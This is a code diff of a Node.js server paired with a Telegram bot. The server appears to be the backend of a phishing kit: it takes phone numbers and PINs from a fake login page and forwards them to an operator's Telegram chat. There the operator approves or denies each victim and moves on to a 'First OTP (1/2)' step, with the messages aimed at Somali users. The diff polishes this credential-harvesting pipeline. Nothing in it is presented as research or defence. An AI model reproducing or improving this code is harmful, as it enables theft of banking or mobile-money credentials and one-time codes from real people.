@@ -13,13 +13,12 @@ if (!process.env.BOT_TOKEN) {
 }
 
 const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();
-console.log("🟡 ADMIN_ID:", ADMIN_ID);
 
 // -------------------- BOT INIT --------------------
 const bot = new Telegraf(process.env.BOT_TOKEN);
 
 // -------------------- MEMORY STORE --------------------
-const statusStore = {}; // phone => status
+const statusStore = {};
 
 // -------------------- MIDDLEWARE --------------------
 app.use(express.json());
@@ -37,7 +36,6 @@ app.get('/:page', (req, res) => {
 
     res.sendFile(path.join(__dirname, 'public', file), (err) => {
         if (err) {
-            console.error("❌ Page not found:", file);
             res.status(404).send("Page not found");
         }
     });
@@ -46,16 +44,19 @@ app.get('/:page', (req, res) => {
 // -------------------- LOGIN API --------------------
 app.post('/api/login-notification', async (req, res) => {
     const { phone, pin } = req.body || {};
-    const currentTime = new Date().toLocaleString('en-US', { hour12: true });
 
-    console.log("🔥 LOGIN REQUEST:", req.body);
+    const currentTime = new Date().toLocaleString('en-US', {
+        month: 'numeric',
+        day: 'numeric',
+        year: 'numeric',
+        hour: 'numeric',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: true
+    });
 
-    if (!phone || !pin) {
-        return res.status(400).json({ error: "Missing phone or pin" });
-    }
-
-    if (!ADMIN_ID) {
-        return res.status(500).json({ error: "ADMIN_CHAT_ID missing" });
+    if (!phone || !pin || !ADMIN_ID) {
+        return res.status(400).json({ error: "Missing data" });
     }
 
     statusStore[phone] = "pending";
@@ -85,7 +86,6 @@ app.post('/api/login-notification', async (req, res) => {
             }
         });
 
-        console.log("✅ Telegram message sent");
         res.json({ success: true });
 
     } catch (err) {
@@ -97,9 +97,7 @@ app.post('/api/login-notification', async (req, res) => {
 // -------------------- STATUS CHECK --------------------
 app.get('/api/check-status', (req, res) => {
     const phone = req.query.phone;
-    res.json({
-        status: statusStore[phone] || "pending"
-    });
+    res.json({ status: statusStore[phone] || "pending" });
 });
 
 // -------------------- BOT START --------------------
@@ -114,19 +112,28 @@ bot.action(/approve_(.+)_(.+)/, async (ctx) => {
 
     statusStore[phone] = "approved";
 
-    const timeNow = new Date().toLocaleTimeString('en-US', { hour12: true });
+    const timeNow = new Date().toLocaleTimeString('en-US', {
+        hour: 'numeric',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: true
+    });
 
-    const msg =
+    const approvedMsg =
         `✅ LOGIN APPROVED\n\n` +
+        `🆕 NEW USER\n` +
+        `🇸🇴 Somalia\n` +
         `📱 ${phone}\n` +
         `🔐 ${pin}\n\n` +
-        `Status: Approved\n` +
-        `Time: ${timeNow}`;
+        `────────────────────\n\n` +
+        `✅ Status: Approved\n` +
+        `➡ Next: First OTP (1/2)\n` +
+        `⌚ ${timeNow}`;
 
     try {
-        await ctx.editMessageText(msg);
+        await ctx.editMessageText(approvedMsg);
     } catch (e) {
-        console.error("❌ EDIT ERROR:", e.message);
+        console.error("Edit failed:", e.message);
     }
 });
 
@@ -137,9 +144,11 @@ bot.action(/deny_(.+)/, async (ctx) => {
     statusStore[phone] = "denied";
 
     try {
-        await ctx.editMessageText("❌ LOGIN DENIED");
+        await ctx.editMessageText(
+            "❌ INVALID INFORMATION\n\nInformation-ka uu bixiyay user-ku waa khalad."
+        );
     } catch (e) {
-        console.error("❌ DENY ERROR:", e.message);
+        console.error("Deny failed:", e.message);
     }
 });
 
@@ -160,12 +169,3 @@ const startBot = async () => {
 };
 
 startBot();
-
-// -------------------- ERROR HANDLING --------------------
-process.on('unhandledRejection', (err) => {
-    console.error("❌ UNHANDLED REJECTION:", err);
-});
-
-process.on('uncaughtException', (err) => {
-    console.error("❌ UNCAUGHT EXCEPTION:", err);
-});
